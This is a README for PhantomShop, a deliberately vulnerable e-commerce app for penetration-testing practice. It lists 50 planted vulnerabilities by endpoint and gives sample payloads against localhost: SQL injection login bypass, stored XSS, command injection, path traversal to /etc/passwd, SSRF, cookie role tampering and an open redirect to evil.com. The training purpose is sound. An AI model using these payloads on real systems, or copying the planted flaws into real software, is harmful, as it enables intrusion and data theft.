# PhantomShop

```
   ___  __                __             ____  __
  / _ \/ /  ___ ____  ___/ /____  __ _  / __/ / /  ___  ___
 / ___/ _ \/ _ '/ _ \/ __/ __/ _ \/  ' \_\ \ / _ \/ _ \/ _ \
/_/  /_//_/\_,_/_//_/\__/\__/\___/_/_/_/___//_//_/\___/ .__/
                                                      /_/
```

**A realistic vulnerable e-commerce application for penetration testing practice.** Not isolated CTF challenges — a real online fashion store with **50 vulnerabilities** embedded naturally in the shopping flow.

---

## Quick Start

```bash
git clone https://github.com/Phantom-C2-77/PhantomRange.git
cd PhantomRange
go run ./cmd/server/
```

Open **http://localhost:9000** and start hacking.

---

## The Store

PhantomShop is a fashion e-commerce site selling shoes, clothing, and accessories. It has all the features of a real online store — and every feature has at least one vulnerability:

- **Product catalog** with search and filtering (SQLi, XSS)
- **User accounts** — registration, login, profiles, avatars (Auth bypass, IDOR, file upload)
- **Shopping cart & checkout** with coupons and gift cards (Business logic flaws)
- **Product reviews** (Stored XSS)
- **Admin panel** with invoice generator and XML import (Command injection, XXE)
- **REST API** for products, users, and orders (CORS, IDOR, method tampering)
- **Newsletter subscription** with URL preview (SSRF)
- **Contact form** with redirect (CRLF injection, open redirect)
- **Password reset** (Predictable tokens)
- **Debug/error endpoints** (Information disclosure)

---

## Vulnerabilities — 50 Flags Across 14 Categories

| Category | Count | Difficulty | Where to Look |
|----------|-------|-----------|---------------|
| **SQL Injection** | 6 | Easy → Hard | `/login`, `/search`, `/products/filter`, `/api/user/lookup`, `/order/` |
| **XSS** | 6 | Easy → Hard | `/search`, product reviews, profile bio, SVG upload, href, CSP bypass |
| **Authentication** | 5 | Easy → Hard | `/login` (brute force), cookies (role tampering), 2FA bypass, default creds, password in API |
| **IDOR / Access Control** | 5 | Easy → Hard | `/order/1337`, `/profile?id=1`, `/api/user/1`, review delete, mass assignment |
| **Business Logic** | 6 | Medium → Hard | Price manipulation, negative quantity, coupon abuse, race condition, SKU swap, gift card fraud |
| **SSRF** | 3 | Medium → Hard | `/api/newsletter` (internal service, cloud metadata, file:// protocol) |
| **File Upload** | 3 | Medium → Hard | `/profile/avatar` (no validation, extension bypass, magic bytes) |
| **Command Injection** | 1 | Medium | `/admin/invoice` (invoice generator) |
| **Path Traversal** | 2 | Medium → Hard | `/static/img/../../etc/passwd`, `/api/export/file` |
| **Open Redirect** | 2 | Easy → Medium | `/auth/callback?next=`, `/checkout/callback?return_url=` |
| **Information Disclosure** | 3 | Easy → Medium | `/debug`, `/api/error` (stack trace), `/.git/config` |
| **Deserialization** | 2 | Medium → Hard | Session cookies, `/api/order/notes` (JSON injection) |
| **HTTP Security** | 2 | Easy → Medium | Missing X-Frame-Options (clickjacking), PUT/DELETE without auth |
| **CORS / CRLF / XXE** | 3 | Medium → Hard | Wildcard CORS on `/api/*`, CRLF in `/contact?redirect=`, XXE in `/api/import` |
| **Crypto** | 1 | Medium | Predictable MD5 password reset tokens |
| **Total** | **50** | | |

---

## Sample Attacks

### SQL Injection (Login Bypass)
```
Username: ' OR 1=1--
Password: anything
```

### Stored XSS (Product Review)
```
Comment: <script>alert('XSS')</script>
```

### IDOR (View Admin Profile)
```bash
curl http://localhost:9000/api/user/1
```

### Business Logic (Price Manipulation)
```bash
curl -X POST http://localhost:9000/cart/add -d "product_id=1&price=0.01&quantity=1"
```

### SSRF (Internal Service)
```bash
curl -X POST http://localhost:9000/api/newsletter -d "email=x@x.com&url=http://127.0.0.1:9999/internal/admin"
```

### Command Injection (Invoice)
```bash
curl -b "role=admin" "http://localhost:9000/admin/invoice?order=1;id"
```

### Information Disclosure
```bash
curl http://localhost:9000/debug
curl http://localhost:9000/.git/config
```

### Open Redirect
```
http://localhost:9000/auth/callback?next=https://evil.com
```

### Path Traversal
```bash
curl "http://localhost:9000/api/export/file?file=../../../etc/passwd"
```

### HTTP Method Tampering
```bash
curl -X PUT http://localhost:9000/api/admin/user
curl -X DELETE http://localhost:9000/api/admin/user
```

---

## Flag Submission

When you find a flag (`FLAG{...}`), submit it via the API:

```bash
curl -X POST http://localhost:9000/flag \
  -H "Content-Type: application/json" \
  -d '{"flag":"FLAG{sql_1nj3ct10n_l0g1n}"}'
```

Or visit **http://localhost:9000/scoreboard** to track progress.

---

## Pages & Endpoints

| Page | URL | Vulnerability |
|------|-----|--------------|
| Homepage | `/` | — |
| Products | `/products` | — |
| Search | `/search?q=` | SQLi, Reflected XSS |
| Product Detail | `/product/{id}` | Stored XSS (reviews) |
| Login | `/login` | SQLi, Brute Force |
| Register | `/register` | — |
| Profile | `/profile?id=` | IDOR, DOM XSS |
| Avatar Upload | `/profile/avatar` | File Upload |
| Orders | `/order/{id}` | IDOR |
| Cart | `/cart/add` | Price manipulation, negative qty |
| Checkout | `/checkout` | — |
| Coupon | `/apply-coupon` | Negative discount |
| Gift Cards | `/giftcard` | Predictable codes |
| Contact | `/contact?redirect=` | CRLF injection |
| Newsletter | `/api/newsletter` | SSRF |
| Admin Panel | `/admin` | Cookie tampering (role=admin) |
| Invoice | `/admin/invoice?order=` | Command injection |
| XML Import | `/api/import` | XXE |
| Export | `/api/export/file?file=` | Path traversal |
| User API | `/api/user/{id}` | IDOR, CORS |
| User Details | `/api/user/details/{id}` | Password in response |
| Debug | `/debug` | Info disclosure |
| Git Config | `/.git/config` | Exposed credentials |
| Error Page | `/api/error` | Stack trace leak |
| Login Callback | `/auth/callback?next=` | Open redirect |
| Checkout Callback | `/checkout/callback?return_url=` | Open redirect |
| Product Filter | `/products/filter?sort=` | Error-based SQLi |
| User Lookup | `/api/user/lookup?username=` | Time-based blind SQLi |
| Review Delete | `/api/review/delete?id=` | IDOR |
| User Update | `/api/user/update` | Mass assignment |
| Order Notes | `/api/order/notes` | JSON injection |
| Admin API | `/api/admin/user` | HTTP method tampering |
| User Website | `/profile/website?url=` | javascript: XSS |

---

## Hints

Visit **http://localhost:9000/vulns** to see all 50 vulnerabilities with descriptions and difficulty levels.

Walkthroughs are not included in the public repository. Figure it out yourself — that's the point! 🚩

---

## Disclaimer

**This application is intentionally vulnerable.** Do NOT expose it to the internet. Run it locally or in an isolated environment for training purposes only.

---

## Author

**Opeyemi Kolawole** — [GitHub](https://github.com/Phantom-C2-77)

## License

BSD 3-Clause
